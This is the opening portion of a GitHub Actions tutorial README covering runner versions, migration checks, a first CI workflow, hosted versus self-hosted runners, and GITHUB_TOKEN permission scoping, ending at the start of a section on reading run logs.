# Learn GitHub Actions ⚙️

<div align="center">

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![GitHub Actions](https://img.shields.io/badge/GitHub_Actions-runner_v2-2088FF.svg?logo=githubactions&logoColor=white)](https://docs.github.com/en/actions)
[![CI](https://github.com/TheLearningHubOrg/learn-github-actions/actions/workflows/ci.yml/badge.svg)](https://github.com/TheLearningHubOrg/learn-github-actions/actions/workflows/ci.yml)
[![Release](https://img.shields.io/github/v/release/TheLearningHubOrg/learn-github-actions)](https://github.com/TheLearningHubOrg/learn-github-actions/releases)
[![CI/CD](https://img.shields.io/badge/CI%2FCD-workflows-purple.svg)](https://docs.github.com/en/actions/writing-workflows)
[![Actions](https://img.shields.io/badge/actions-JavaScript_%7C_composite_%7C_Docker-purple.svg)](https://docs.github.com/en/actions/sharing-automations/creating-actions)

**From your first workflow file to running a secure, self-hosted CI/CD platform for a whole organisation on GitHub Actions.**  
Workflow syntax, triggers, contexts and expressions, job graphs, matrices, caching, artifacts, concurrency, custom actions, reusable workflows, OIDC, supply-chain hardening and Actions Runner Controller.

[Getting Started](#1-stage-1-core-model-runners--your-first-workflow) • [Syntax & Expressions](#2-stage-2-workflow-syntax-triggers-contexts--expressions) • [Orchestration](#3-stage-3-pipeline-orchestration-jobs-matrices-caching-artifacts--concurrency) • [Custom Actions](#4-stage-4-custom-actions--reusable-components) • [Security & OIDC](#5-stage-5-security-secrets--cloud-oidc-federation) • [Self-Hosted Scale](#6-stage-6-self-hosted-runners--scalable-infrastructure) • [Interview Prep](#7-stage-7-staff-github-actions-platform-engineer-interview-handbook--cheatsheet)

<br/>

<a href="https://www.buymeacoffee.com/manthanank">
  <img src="public/bmc-button.svg" alt="Buy Me A Coffee" width="180">
</a>

</div>

---

## 🗺️ 7-Stage Pedagogical Roadmap

```mermaid
flowchart LR
    S1["Stage 1: Core Model & First Workflow"] --> S2["Stage 2: Syntax & Expressions"]
    S2 --> S3["Stage 3: Orchestration"]
    S3 --> S4["Stage 4: Custom Actions"]
    S4 --> S5["Stage 5: Security & OIDC"]
    S5 --> S6["Stage 6: Self-Hosted Scale"]
    S6 --> M["Masterclasses"]
    M --> S7["Stage 7: Staff Interview Handbook"]
```

| Stage | Focus Domain | Core Concepts & Engineering Outcomes |
| :--- | :--- | :--- |
| **Stage 1** | **Core Model, Runners & Your First Workflow** | Event → workflow → job → step → action hierarchy; `runs-on` labels (`ubuntu-latest`, `ubuntu-24.04-arm`, `windows-latest`, `macos-latest`); the runner job lifecycle; `GITHUB_TOKEN` and `permissions:`; `gh run watch`, `gh run view --log-failed`, debug logging, `act`. Outcome: a working CI workflow you can read line by line and debug from the terminal. |
| **Stage 2** | **Workflow Syntax, Triggers, Contexts & Expressions** | `on:` filters (`branches`, `paths`, `types`, `schedule`, `workflow_dispatch` inputs); `pull_request` vs `pull_request_target` vs `workflow_run`; the `github`, `env`, `vars`, `secrets`, `steps`, `needs`, `matrix` contexts and where each is allowed; operators, `fromJSON`, `hashFiles`, type coercion; the implicit `success()`; `$GITHUB_OUTPUT`, `$GITHUB_ENV`, `$GITHUB_STEP_SUMMARY`; default shells. Outcome: workflows that start only when they should and pass data safely between steps and jobs. |
| **Stage 3** | **Pipeline Orchestration: Jobs, Matrices, Caching, Artifacts & Concurrency** | `needs:` graphs and skip propagation; job outputs; matrix `include`/`exclude` rules and the 256-job limit; dynamic matrices with `fromJSON`; `fail-fast`, `max-parallel`, `continue-on-error`, `timeout-minutes`; `actions/cache` keys, scopes and eviction; `upload-artifact`/`download-artifact` v4; service containers; `concurrency` groups. Outcome: a fast, parallel pipeline whose behaviour you can predict and test. |
| **Stage 4** | **Custom Actions & Reusable Components** | Composite, Docker and JavaScript actions (`action.yml`, `runs.using: node24`); the runner protocol behind `@actions/core`; reusable workflows (`workflow_call`, `secrets: inherit`); `actions/github-script`; Trivy and SARIF upload. Outcome: shared building blocks that other repositories call. |
| **Stage 5** | **Security, Secrets & Cloud OIDC Federation** | OIDC to AWS, Azure and Google Cloud (`id-token: write`, `sub` claim design); environments with required reviewers; pinning actions by SHA; expression injection and `::add-mask::`. Outcome: deployments with no long-lived cloud keys and a workflow set that survives a malicious pull request. |
| **Stage 6** | **Self-Hosted Runners & Scalable Infrastructure** | Actions Runner Controller and runner scale sets on Kubernetes; ephemeral pods and storage cleanup; artifact retention and storage cost. Outcome: an autoscaling runner fleet with no state shared between jobs. |
| **Masterclasses** | **Deep dives (added in the next revision)** | Supply-chain provenance, ARC internals, monorepo pipelines, publishing actions, and a flagship golden-pipeline platform. |
| **Stage 7** | **Staff Interview Handbook** | Staff-level Q&As with code and diagrams, scenario debugging questions, and a one-page cheatsheet. |

**Which language the examples use, and why.** GitHub Actions reads only YAML workflow files, so every pipeline example is a workflow in YAML, with Bash in the `run:` steps because Bash is the default shell on Linux and macOS runners. Custom actions and the starter project are JavaScript (ES modules on Node 24): the runner executes JavaScript actions directly with the Node version named in `action.yml`, and GitHub's own toolkit (`@actions/core`, `@actions/github`) is a JavaScript library. The tests use Node's built-in `node:test`, so the starter has no dependencies to install.

---

## 🆕 GitHub Actions Versions, What's New & Migration

GitHub Actions is a hosted service, so there is no single version number to install. What changes over time is the runner application (`actions/runner`, currently in the 2.x series), the hosted runner images behind labels such as `ubuntu-latest`, the Node runtime that JavaScript actions run on, and the major versions of the official actions (`actions/checkout`, `actions/cache`, and so on). This section tracks those four moving parts.

### V.1 Release Timeline

```mermaid
timeline
    title GitHub Actions milestones that matter for this guide
    section 2019
      General availability with CI/CD : YAML workflows replace the HCL beta
    section 2020
      Environments and required reviewers : gated deployments
    section 2021
      OIDC tokens for cloud login : no stored cloud keys
      Reusable workflows : workflow_call
    section 2022
      set-output and save-state deprecated : GITHUB_OUTPUT and GITHUB_STATE files
    section 2023
      upload-artifact and download-artifact v4 : immutable artifacts, faster uploads
    section 2024
      Artifact attestations : signed build provenance
    section 2025
      New cache service : actions/cache v4.2 or newer required
      Arm64 hosted Linux runners : ubuntu-24.04-arm
      node24 action runtime : checkout v5 and setup-node v5
    section 2026 (current stable)
      Node 20 end of life : actions move to node24
```

### V.2 Compatibility Matrix

| Moving part | Current value (late 2026) | Earlier values still seen | Notes |
| --- | --- | --- | --- |
| `ubuntu-latest` | Ubuntu 24.04 (x64) | `ubuntu-22.04` | `ubuntu-20.04` was retired in 2025. Pin `ubuntu-24.04` when image changes must be deliberate. |
| Arm64 Linux | `ubuntu-24.04-arm`, `ubuntu-22.04-arm` | none | Free for public repositories; a larger-runner product for private ones. |
| `windows-latest` | Windows Server 2025 | `windows-2022` | `windows-2019` was retired in 2025. |
| `macos-latest` | macOS 15 on Apple silicon | `macos-14` | Intel macOS images are being phased out; check the runner-images repository before pinning one. |
| JavaScript action runtime | `node24` | `node20` (end of life April 2026), `node16`, `node12` (removed) | Set in `runs.using` of `action.yml`. |
| `actions/checkout` | v5 (node24) | v4 (node20) | Newer majors are fine; read the release notes for credential handling changes. |
| `actions/setup-node` | v5 | v4 | v5 can turn caching on automatically when `packageManager` is set in package.json. |
| `actions/cache` | v4 (4.2 or newer) | v3 (only 3.4+ still works) | Versions older than these stopped working when the cache service changed in 2025. |
| `actions/upload-artifact`, `download-artifact` | v4 or newer | v3 (shut down) | v4 artifacts are immutable and names must be unique per run. |
| Runner application | 2.x, current stable | older 2.x | Self-hosted runners must stay within the support window or GitHub stops sending them jobs. |

### V.3 What's New in Current Stable

#### Node 24 for JavaScript actions

JavaScript actions name their runtime in `action.yml`. Node 20 reached end of life in April 2026, and GitHub is moving JavaScript actions to Node 24. Publish new actions with `node24`, and test them on Node 24 before you release.

```yaml
# Before
runs:
  using: node20
  main: dist/index.js
```

```yaml
# After
runs:
  using: node24
  main: dist/index.js
```

The starter's own action, [`actions/matrix-plan/action.yml`](actions/matrix-plan/action.yml), uses `node24`.

#### File commands instead of `::set-output`

The `::set-output` and `::save-state` log commands were deprecated because any process that could print to the log could forge an output. Outputs now go to the file whose path is in `$GITHUB_OUTPUT`.

```yaml
# Before (deprecated, prints a warning or fails)
- id: meta
  run: echo "::set-output name=version::1.4.0"
```

```yaml
# After
- id: meta
  run: echo "version=1.4.0" >> "$GITHUB_OUTPUT"
```

#### Artifacts v4: unique names and merging

From v4, an artifact is immutable once uploaded and its name must be unique within the run. Matrix jobs that used to upload into one shared artifact name now upload under their own names and the consumer merges them.

```yaml
# Before (v3): every matrix job appended to "reports"
- uses: actions/upload-artifact@v3
  with:
    name: reports
    path: report.xml
```

```yaml
# After (v4): one artifact per job, merged on download
- uses: actions/upload-artifact@v4
  with:
    name: report-${{ matrix.os }}-${{ matrix.node }}
    path: report.xml
# ...in the consumer job
- uses: actions/download-artifact@v4
  with:
    pattern: report-*
    merge-multiple: true
```

#### Arm64 hosted Linux runners

Native Arm64 builds no longer need QEMU emulation or a self-hosted Graviton box.

```yaml
# Before: emulated arm64 build on x64, often 5-10x slower
- uses: docker/setup-qemu-action@v3
- run: docker buildx build --platform linux/arm64 .
```

```yaml
# After: a native arm64 job
jobs:
  build-arm:
    runs-on: ubuntu-24.04-arm
    steps:
      - uses: actions/checkout@v5
      - run: docker build .
```

#### Artifact attestations

A job can sign provenance for what it built, and anyone can verify it later with `gh attestation verify`. Stage 5 and the masterclasses cover the trust model.

```yaml
permissions:
  contents: read
  id-token: write      # sign with a short-lived Sigstore certificate
  attestations: write  # store the attestation
steps:
  - run: tar -czf app.tgz dist/
  - uses: actions/attest-build-provenance@v2
    with:
      subject-path: app.tgz
```

### V.4 Migration Guide (older workflows → current stable)

Run these from the root of a repository to find what needs to change, then fix each hit.

```bash
# 1. Deprecated log commands
grep -rnE '::(set-output|save-state|set-env|add-path)' .github/

# 2. Actions on retired or end-of-life majors
grep -rnE 'actions/(checkout|setup-node|setup-python|setup-go|setup-java)@v[1-4]\b' .github/
grep -rnE 'actions/(upload|download)-artifact@v[1-3]\b' .github/
grep -rnE 'actions/cache@v[1-3]\b' .github/

# 3. Your own actions still on old runtimes
grep -rnE 'using:\s*["'"'"']?node(12|16|20)' --include=action.yml --include=action.yaml .

# 4. Retired runner images
grep -rnE 'runs-on:.*(ubuntu-20\.04|windows-2019|macos-1[23])' .github/

# 5. Lint everything after the edits (shellcheck runs inside actionlint)
docker run --rm -v "$PWD:/repo" --workdir /repo rhysd/actionlint:1.7.9 -color
```

Then let Dependabot keep action versions current from now on:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
    groups:
      actions:
        patterns: ['*']
```

### V.5 Deprecations & Breaking Changes

| Change | Deprecated / removed | Replacement | What breaks and how to fix it |
| --- | --- | --- | --- |
| Log commands for outputs and env | `::set-output`, `::save-state`, `::set-env`, `::add-path` | `$GITHUB_OUTPUT`, `$GITHUB_STATE`, `$GITHUB_ENV`, `$GITHUB_PATH` | `set-env`/`add-path` are disabled and fail the step. Rewrite to `echo "k=v" >> "$GITHUB_OUTPUT"`. |
| Node 12 and 16 action runtimes | removed | `node24` | Actions declaring them run on a newer Node; rebuild and republish your own actions. |
| Node 20 action runtime | end of life April 2026 | `node24` | Upgrade action majors (`checkout@v5`, `setup-node@v5` and so on) and your own `action.yml` files. |
| Artifacts v3 | shut down | `upload-artifact@v4`, `download-artifact@v4` | Steps on v3 fail. On v4, give each matrix job a unique artifact name and use `merge-multiple`. |
| Legacy cache service | old `actions/cache` releases stopped working in 2025 | `actions/cache@v4` (4.2+) | Restores silently miss or the step errors. Bump the action. |
| `ubuntu-20.04`, `windows-2019` images | retired | `ubuntu-24.04`, `windows-2022`/`windows-2025` | Jobs queue and then fail with no matching runner. Change `runs-on`. |
| Default `GITHUB_TOKEN` permissions | read/write default for old repos | read-only default for new organisations and repositories | Workflows that relied on implicit write access fail with `403 Resource not accessible by integration`. Declare `permissions:` explicitly. |

---

## 📋 Table of Contents

- [🆕 GitHub Actions Versions, What's New & Migration](#-github-actions-versions-whats-new--migration)
- [1. Stage 1: Core Model, Runners & Your First Workflow](#1-stage-1-core-model-runners--your-first-workflow)
  - [1.1 What GitHub Actions Is and Where It Fits](#11-what-github-actions-is-and-where-it-fits)
  - [1.2 Anatomy of a Workflow: Events, Workflows, Jobs, Steps and Actions](#12-anatomy-of-a-workflow-events-workflows-jobs-steps-and-actions)
  - [1.3 Your First Workflow, Line by Line](#13-your-first-workflow-line-by-line)
  - [1.4 GitHub-Hosted vs Self-Hosted Runners: Architecture & Threat Model](#14-github-hosted-vs-self-hosted-runners-architecture--threat-model)
  - [1.5 The Runner Execution Lifecycle: From Webhook to Cleanup](#15-the-runner-execution-lifecycle-from-webhook-to-cleanup)
  - [1.6 The GITHUB_TOKEN and the `permissions:` Block](#16-the-github_token-and-the-permissions-block)
  - [1.7 Reading Runs: Logs, Debug Logging, Re-runs and the gh CLI](#17-reading-runs-logs-debug-logging-re-runs-and-the-gh-cli)
  - [1.8 Running Workflows Locally with act](#18-running-workflows-locally-with-act)
  - [1.9 Walking Through the Starter Project](#19-walking-through-the-starter-project)
  - [1.10 Pitfalls](#110-pitfalls)
  - [1.11 Best Practices](#111-best-practices)
  - [1.12 Hands-on Exercise](#112-hands-on-exercise)
- [2. Stage 2: Workflow Syntax, Triggers, Contexts & Expressions](#2-stage-2-workflow-syntax-triggers-contexts--expressions)
  - [2.1 Trigger Events and Filters](#21-trigger-events-and-filters)
  - [2.2 Event Activity Types Reference Matrix](#22-event-activity-types-reference-matrix)
  - [2.3 `pull_request` vs `pull_request_target` vs `workflow_run`: Trust Boundaries](#23-pull_request-vs-pull_request_target-vs-workflow_run-trust-boundaries)
  - [2.4 Contexts and Where Each One Is Available](#24-contexts-and-where-each-one-is-available)
  - [2.5 Expressions: Operators, Functions and Type Coercion](#25-expressions-operators-functions-and-type-coercion)
  - [2.6 Status Check Functions and the Implicit `success()`](#26-status-check-functions-and-the-implicit-success)
  - [2.7 Variables: `env` Precedence, Configuration Variables and Secrets](#27-variables-env-precedence-configuration-variables-and-secrets)
  - [2.8 Step Outputs, Job Outputs and File Commands](#28-step-outputs-job-outputs-and-file-commands)
  - [2.9 Shells, `defaults` and `working-directory`](#29-shells-defaults-and-working-directory)
  - [2.10 Pitfalls](#210-pitfalls)
  - [2.11 Best Practices](#211-best-practices)
  - [2.12 Hands-on Exercise](#212-hands-on-exercise)
- [3. Stage 3: Pipeline Orchestration: Jobs, Matrices, Caching, Artifacts & Concurrency](#3-stage-3-pipeline-orchestration-jobs-matrices-caching-artifacts--concurrency)
  - [3.1 Directed Dependency Graphs with `needs:` and Parallelism](#31-directed-dependency-graphs-with-needs-and-parallelism)
  - [3.2 Job Outputs and Conditional Jobs Across the Graph](#32-job-outputs-and-conditional-jobs-across-the-graph)
  - [3.3 Matrix Strategies: Expansion Rules, `include` and `exclude`](#33-matrix-strategies-expansion-rules-include-and-exclude)
  - [3.4 Dynamic Matrices with `fromJSON`](#34-dynamic-matrices-with-fromjson)
  - [3.5 `fail-fast`, `max-parallel`, `continue-on-error` and Timeouts](#35-fail-fast-max-parallel-continue-on-error-and-timeouts)
  - [3.6 Caching with `actions/cache`: Keys, Scope and Eviction](#36-caching-with-actionscache-keys-scope-and-eviction)
  - [3.7 Artifacts: Passing Files Between Jobs and Keeping Results](#37-artifacts-passing-files-between-jobs-and-keeping-results)
  - [3.8 Service Containers and Job Containers](#38-service-containers-and-job-containers)
  - [3.9 Concurrency Groups and Cancel-in-Progress](#39-concurrency-groups-and-cancel-in-progress)
  - [3.10 Pitfalls](#310-pitfalls)
  - [3.11 Best Practices](#311-best-practices)
  - [3.12 Hands-on Exercise](#312-hands-on-exercise)
- [4. Stage 4: Custom Actions & Reusable Components](#4-stage-4-custom-actions--reusable-components)
  - [4.1 Composite Actions: Architecture & Implementation](#41-composite-actions-architecture--implementation)
  - [4.2 Docker Container Actions: Isolated Polyglot Runtimes](#42-docker-container-actions-isolated-polyglot-runtimes)
  - [4.3 Custom JavaScript Actions with `@actions/core`](#43-custom-javascript-actions-with-actionscore)
  - [4.4 Reusable Workflows (`workflow_call`) vs Starter Workflows](#44-reusable-workflows-workflow_call-vs-starter-workflows)
  - [4.5 Orchestrating GitHub APIs with `actions/github-script`](#45-orchestrating-github-apis-with-actionsgithub-script)
  - [4.6 Container Vulnerability Scanning with Trivy & SARIF Upload](#46-container-vulnerability-scanning-with-trivy--sarif-upload)
- [5. Stage 5: Security, Secrets & Cloud OIDC Federation](#5-stage-5-security-secrets--cloud-oidc-federation)
  - [5.1 OpenID Connect (OIDC): Keyless Cloud Authentication to AWS, Azure and Google Cloud](#51-openid-connect-oidc-keyless-cloud-authentication-to-aws-azure-and-google-cloud)
  - [5.2 GitHub Environments, Required Reviewers & Deployment Branches](#52-github-environments-required-reviewers--deployment-branches)
  - [5.3 Supply Chain Hardening: Pinning by SHA, Dependabot, and Harden-Runner](#53-supply-chain-hardening-pinning-by-sha-dependabot-and-harden-runner)
  - [5.4 Secret Masking, Log Sanitation, and Preventing Expression Injection](#54-secret-masking-log-sanitation-and-preventing-expression-injection)
- [6. Stage 6: Self-Hosted Runners & Scalable Infrastructure](#6-stage-6-self-hosted-runners--scalable-infrastructure)
  - [6.1 Actions Runner Controller (ARC) on Kubernetes](#61-actions-runner-controller-arc-on-kubernetes)
  - [6.2 Ephemeral Runner Pod Lifecycle & Storage Volume Cleanup](#62-ephemeral-runner-pod-lifecycle--storage-volume-cleanup)
  - [6.3 Artifact Retention Strategies and Storage Optimisation](#63-artifact-retention-strategies-and-storage-optimisation)
- [7. Stage 7: Staff GitHub Actions Platform Engineer Interview Handbook & Cheatsheet](#7-stage-7-staff-github-actions-platform-engineer-interview-handbook--cheatsheet)
  - [7.1 Core Concepts (Q1-Q10)](#71-core-concepts-q1-q10)
  - [7.2 Internals & Performance (Q11-Q17)](#72-internals--performance-q11-q17)
  - [7.3 Architecture & Design (Q18-Q24)](#73-architecture--design-q18-q24)
  - [7.4 Scenario & Debugging Questions (Q25-Q27)](#74-scenario--debugging-questions-q25-q27)
  - [7.5 Staff Cheatsheet](#75-staff-cheatsheet)
- [🧪 Example Projects](#-example-projects)
- [📝 Cheat Sheets](#-cheat-sheets)
- [📚 Resources](#-resources)
- [🤝 Contributing](#-contributing)
- [📄 License](#-license)
- [🙏 Acknowledgments](#-acknowledgments)
- [🌐 Connect with me](#-connect-with-me)
- [☕ Support](#-support)

---
## 1. Stage 1: Core Model, Runners & Your First Workflow

This stage explains what GitHub Actions is made of and what happens between `git push` and a green check. You need a GitHub account, Git, and a repository you can push to; the [GitHub CLI](https://cli.github.com/) (`gh`) is optional but used throughout. By the end you can write a CI workflow from memory, say which machine each part runs on, scope its token, and debug a failed run from the terminal.

```mermaid
flowchart LR
    Push["git push"] --> Event["push event"]
    Event --> Match["GitHub matches .github/workflows/*.yml"]
    Match --> Run["Workflow run"]
    Run --> Queue["Jobs queued by runs-on label"]
    Queue --> Runner["Runner VM picks up a job"]
    Runner --> Steps["Steps run in order"]
    Steps --> Check["Check status on the commit or PR"]
```

### 1.1 What GitHub Actions Is and Where It Fits

GitHub Actions is an event-driven automation service built into GitHub. A YAML file in `.github/workflows/` says which repository events start it, and GitHub schedules the work on machines called runners. CI/CD is the most common use, but the same engine labels issues, publishes packages, rotates secrets on a schedule and responds to webhooks from other systems.

Three properties set it apart from a standalone CI server:

- **The trigger surface is all of GitHub.** Pushes and pull requests, but also issues, comments, releases, deployments, merge queues, schedules and API calls. The event payload is available to every step.
- **Reuse is by reference.** A step can `uses:` an action from any public repository, the Marketplace, a local folder or a Docker image, pinned to a tag or a commit SHA.
- **Identity comes with the run.** Every job gets a short-lived `GITHUB_TOKEN` for the repository and can request an OIDC token that cloud providers trust. There is no build-server service account to manage.

| Concern | GitHub Actions | Jenkins | GitLab CI/CD | CircleCI |
| --- | --- | --- | --- | --- |
| Where config lives | `.github/workflows/*.yml`, many files per repo | `Jenkinsfile` (Groovy) or job config in the UI | One `.gitlab-ci.yml` (plus `include:`) | `.circleci/config.yml` |
| What starts a run | Any GitHub event, schedule, API, other workflows | SCM polling, webhooks, plugins | Pushes, MRs, schedules, API, pipelines in other projects | Pushes, PRs, schedules, API |
| Reuse unit | Actions and reusable workflows | Shared libraries, plugins | `include:` templates, CI/CD components | Orbs |
| Hosted compute | Linux x64/arm64, Windows, macOS, GPU and larger runners | None (you run agents) | Linux, Windows, macOS SaaS runners | Linux, Windows, macOS, Arm, GPU |
| Self-hosted | Runner app on any VM, or ARC on Kubernetes | Agents | GitLab Runner | Self-hosted runners |
| Cloud auth | OIDC built in | Plugins and stored credentials | OIDC (ID tokens) | OIDC |

Pick Actions when the code is on GitHub and you want CI, automation and access control in one place. Its weak spots are long-running stateful build farms (a 6-hour job limit on hosted runners), and very large monorepos, which need deliberate design (Stage 3 and the masterclasses).

### 1.2 Anatomy of a Workflow: Events, Workflows, Jobs, Steps and Actions

GitHub Actions executes automation through an event-driven hierarchy. Every component serves a specific level of abstraction:

```mermaid
graph TD
    Event["1. GitHub Event (Push / PR / Schedule / Dispatch)"] --> Workflow["2. Workflow (.github/workflows/*.yml)"]
    Workflow --> Job1["3. Job A (runs-on: ubuntu-latest)"]
    Workflow --> Job2["3. Job B (runs-on: self-hosted)"]
    Job1 --> Step1["4. Step 1: actions/checkout@v5"]
    Job1 --> Step2["4. Step 2: npm test (shell command)"]
    Step1 --> Action["5. Action (reusable unit of code)"]
```

| Component | Scope | Execution Target | Lifecycle / State |
| :--- | :--- | :--- | :--- |
| **Event** | Webhook trigger | GitHub platform | Creates one workflow run per matching workflow file |
| **Workflow** | Orchestrator file | Repository | Lives in `.github/workflows/*.yml`; the file on the event's commit is the one that runs |
| **Job** | Compute boundary | One runner (VM or container) | Runs in parallel with other jobs unless ordered with `needs:` |
| **Step** | Sequential task | The job's runner, inside `$GITHUB_WORKSPACE` | Runs in order; steps in a job share the filesystem and env files |
| **Action** | Reusable module | Called by a step with `uses:` | Packaged as JavaScript, a Docker container, or composite steps |

Two rules follow from this table and explain most beginner surprises:

1. **Jobs share nothing by default.** Each job gets a fresh machine. To hand files to another job you upload an artifact (Stage 3.7); to hand values, you use job outputs (Stage 3.2).
2. **Steps share everything within a job.** A file written in step 2 is there in step 5, and so is anything appended to `$GITHUB_ENV` or `$GITHUB_PATH`. Each `run:` step, however, starts a new shell process, so a plain `export FOO=1` is gone in the next step.

### 1.3 Your First Workflow, Line by Line

This is [`examples/workflows/01-hello-ci.yml`](examples/workflows/01-hello-ci.yml). Copy it to `.github/workflows/ci.yml` in any repository with a `package.json` and a lockfile.

```yaml
name: Hello CI

on:
  push:
    branches: [main]
  pull_request:

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: Check out the commit that triggered the run
        uses: actions/checkout@v5

      - name: Install Node 24 and restore the npm cache
        uses: actions/setup-node@v5
        with:
          node-version: 24
          cache: npm

      - name: Install exactly what the lockfile says
        run: npm ci

      - name: Run the tests
        run: npm test

      - name: Show where we ran
        run: |
          echo "Runner: $RUNNER_OS / $RUNNER_ARCH"
          echo "Workspace: $GITHUB_WORKSPACE"
          echo "Commit: $GITHUB_SHA on $GITHUB_REF"
```

| Line / API | Role | What happens at runtime |
| :--- | :--- | :--- |
| `name: Hello CI` | Display name | Shown in the Actions tab and in the check name `Hello CI / test`. Without it GitHub shows the file path. |
| `on: push: branches: [main]` | Trigger | A push to `main` creates a run. Pushes to other branches do not. |
| `pull_request:` | Trigger | Opening, updating (`synchronize`) or reopening a PR into any branch creates a run against the PR's merge commit `refs/pull/N/merge`. |
| `permissions: contents: read` | Token scope | The `GITHUB_TOKEN` can read code and nothing else. Every scope you do not list is `none`. |
| `jobs: test:` | Job id | `test` is the id other jobs use in `needs:`, and the second half of the check name. |
| `runs-on: ubuntu-latest` | Runner label | The job waits until a runner with this label is free, then gets a fresh Ubuntu VM. |
| `timeout-minutes: 10` | Guard | The job is cancelled after 10 minutes. The default is 360, so a hung test costs six hours of minutes. |
| `uses: actions/checkout@v5` | Action call | Downloads the action at tag `v5`, then clones the triggering commit into `$GITHUB_WORKSPACE` with a depth of 1. |
| `uses: actions/setup-node@v5` + `with:` | Action call with inputs | Puts Node 24 on `PATH` and restores the npm cache keyed on the lockfile hash; saves it at job end if it changed. |
| `run: npm ci` | Shell step | Runs in `bash -e`. A non-zero exit code fails the step, which fails the job. |
| `run: \|` | Multi-line script | The block is written to a temp file and executed. `$RUNNER_OS` and friends are ordinary environment variables the runner sets. |

What appears in the pull request: a check named **Hello CI / test** with a link to the logs. If you make it a required check in branch protection (or a ruleset), the PR cannot merge until it passes.

### 1.4 GitHub-Hosted vs Self-Hosted Runners: Architecture & Threat Model

A runner is a machine running the open-source runner application, which asks GitHub for jobs and executes them. Choosing the proper execution environment is critical for balancing operational overhead, cost, and security:

```mermaid
flowchart TD
    subgraph GitHubHosted["GitHub-Hosted Runners (Managed VM)"]
        GH1["Fresh VM per job"] --> GH2["Pre-installed tools (Docker, Node, Go, Java...)"]
        GH2 --> GH3["Destroyed after the job (ephemeral)"]
    end
    subgraph SelfHosted["Self-Hosted Runners (your hardware or Kubernetes)"]
        SH1["Private VPC / on-prem VM"] --> SH2["Custom GPU / high CPU specs"]
        SH2 --> SH3["Direct access to internal networks"]
    end
```

| Security & Ops Dimension | GitHub-Hosted Runners | Self-Hosted Runners |
| :--- | :--- | :--- |
| **Isolation** | Single-use VM per job | Persistent VM (state leaks between jobs) unless you make it ephemeral, for example ARC pods |
| **VPC Connectivity** | None by default (public internet; Azure private networking for larger runners) | Native access to private databases, registries and subnets |
| **Maintenance** | None (GitHub patches the image weekly) | Yours: OS patching, tool updates, runner app upgrades |
| **Cost Model** | Per-minute billing, free for public repositories on standard runners | Your infrastructure cost; no per-minute charge from GitHub |
| **Public Repo Safety** | Safe: a fork PR gets a throwaway VM | **Severe risk**: a fork PR can run arbitrary code on your machine |

The labels you put in `runs-on` select the machine:

| Label | Machine (late 2026) | Use it for |
| --- | --- | --- |
| `ubuntu-latest`, `ubuntu-24.04` | Ubuntu 24.04, x64 | Default for almost everything |
| `ubuntu-24.04-arm` | Ubuntu 24.04, Arm64 | Native arm64 builds and images |
| `windows-latest`, `windows-2025` | Windows Server 2025 | .NET Framework, MSVC, PowerShell tooling |
| `macos-latest`, `macos-15` | macOS 15, Apple silicon | iOS/macOS builds, Xcode |
| `[self-hosted, linux, x64, gpu]` | Your runner with all of these labels | Hardware or network access you control |
| `group: build-fleet` | Any runner in a runner group | Org-wide pools with access policy |

`-latest` labels move to a new OS version a few months after it ships. Pin the exact version (`ubuntu-24.04`) when an image change must be a reviewed commit rather than a surprise.

### 1.5 The Runner Execution Lifecycle: From Webhook to Cleanup

When an event occurs in a repository, the Actions service evaluates every workflow file and queues jobs. Runners hold an outbound HTTPS long-poll open to GitHub, so a self-hosted runner needs no inbound firewall rule.

```mermaid
sequenceDiagram
    autonumber
    actor Dev as Developer
    participant GH as GitHub Actions service
    participant Runner as Runner (Runner.Listener)
    participant Worker as Runner.Worker
    participant Step as Step process (bash / pwsh / node)

    Dev->>GH: git push origin main
    GH->>GH: Match on: filters (branches, paths, types)
    GH->>GH: Expand matrix, queue jobs by runs-on label
    Runner->>GH: Long-poll for a job (outbound HTTPS)
    GH-->>Runner: Job message with steps, contexts and a GITHUB_TOKEN
    Runner->>Worker: Start worker for this job
    Worker->>Worker: Create workspace, download actions, start service containers
    Worker->>Step: Run each step (pre, main)
    Step-->>Worker: Exit code (0 = success, non-zero = failure)
    Worker->>Step: Run post steps in reverse order (cache save, credential cleanup)
    Worker->>GH: Stream logs, upload results and job outputs
    GH->>Dev: Check status on the commit and pull request
```

Points in this lifecycle that matter later:

- **Action download happens up front.** A typo in `uses:` fails the job in "Set up job", before any step runs.
- **`pre:` and `post:` hooks.** JavaScript and Docker actions can declare `pre` and `post` entry points. `actions/cache` restores in its main step and saves in its post step, which is why a cache is not saved when the job is cancelled before post steps run.
- **The token dies with the job.** `GITHUB_TOKEN` expires when the job finishes, or after 24 hours at most.

### 1.6 The GITHUB_TOKEN and the `permissions:` Block

Every job receives a `GITHUB_TOKEN`, an installation token for a GitHub App that GitHub manages. It can only act on the repository that owns the workflow. Organisations and repositories created since 2023 default it to read-only; older ones may still default to read/write. Never rely on the default: declare it.

```yaml
name: Production Security Gated Pipeline

# Block all permissions globally by default
permissions: {}

jobs:
  build-and-test:
    runs-on: ubuntu-latest
    permissions:
      contents: read       # check out code
      pull-requests: write # post PR review comments
      id-token: write      # request an OIDC token for cloud login
    steps:
      - name: Checkout Source Code
        uses: actions/checkout@v5
```

| Permission Key | Description | Minimum Safe Scope |
| :--- | :--- | :--- |
| `contents` | Repository files, commits, tags, releases | `read` (`write` only for jobs that push tags or create releases) |
| `id-token` | Request an OIDC JWT | `write` only in jobs that log in to a cloud |
| `pull-requests` | PR comments, labels, reviewers | `write` for bots that comment |
| `issues` | Issue comments and labels | `write` for triage bots |
| `checks` / `statuses` | Check runs and commit statuses | `write` for tools that report their own checks |
| `security-events` | Code scanning (SARIF) upload | `write` for CodeQL, Trivy, Checkov upload |
| `packages` | GitHub Packages, including GHCR images | `write` to publish images |
| `actions` | Workflow runs, artifacts, caches | `write` only for jobs that cancel runs or delete caches |
| `attestations` | Artifact attestations | `write` in the job that signs provenance |

Three rules decide the effective permissions:

1. A job-level `permissions:` block **replaces** the workflow-level block for that job; it does not merge with it.
2. Listing any scope sets every unlisted scope to `none`. `permissions: {}` sets all to `none`.
3. Pull requests from forks always get a read-only token, whatever the file says.

The symptom of a missing scope is an HTTP 403 with the message `Resource not accessible by integration`.

### 1.7 Reading Runs: Logs, Debug Logging, Re-runs and the gh CLI

You can do everything from the browser, but the `gh` CLI is faster once a repository has many workflows.

```bash
